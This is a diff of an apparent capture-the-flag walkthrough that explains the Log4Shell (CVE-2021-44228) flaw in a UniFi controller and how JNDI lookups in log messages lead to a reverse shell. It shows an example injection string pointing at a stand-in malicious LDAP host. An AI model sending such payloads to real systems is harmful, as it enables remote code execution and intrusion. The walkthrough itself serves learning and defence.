@@ -31,15 +31,17 @@ When we visit **https://<TARGET_IP>:8443**, we will see this login page
 
 If we look for the vulnerabilities of this unifi version, we will find this [CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2021-44228) related to Log4j2, called Log4Shell.
 
-```java title=Logging Example
+```java
 logger.debug("This is a DEBUG message.");
 logger.info("This is an INFO message.");
 logger.warn("This is a WARN message.");
 ```
+
 This vulnerability can be exploited to give a reverse shell. It works by exploiting improper input handling in log messages format.
 Log4j allows message lookup through JNDI (Java Naming and Directory Interface). JNDI allows lookup from databases, services, network and directories, including LDAP (Lightweight Directory Access Protocol) to retrieve resources.
 
 Malicious input could contain JNDI Lookup string such as :
+
 ```java
 ${jndi:ldap://malicious-server.com/exploit}
 ```
